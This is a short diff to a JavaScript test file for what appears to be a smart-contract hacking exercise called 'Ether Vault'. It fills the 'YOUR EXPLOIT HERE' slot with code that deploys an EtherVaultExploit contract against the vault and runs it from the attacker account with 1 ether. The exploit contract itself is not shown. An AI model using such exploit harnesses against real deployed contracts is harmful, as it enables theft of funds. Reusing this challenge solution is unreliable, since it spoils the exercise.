@@ -22,6 +22,12 @@ describe('[ETHER VAULT EXPLOIT]', async function () {
     it('Exploit', async function () {
         // YOUR EXPLOIT HERE
 
+        let exploit = await (await ethers.getContractFactory('EtherVaultExploit', deployer)).deploy(this.vault.address)
+
+        await exploit.connect(attacker).run({
+            value: ethers.utils.parseEther('1')
+        });
+
     })
 
     after(async function () {
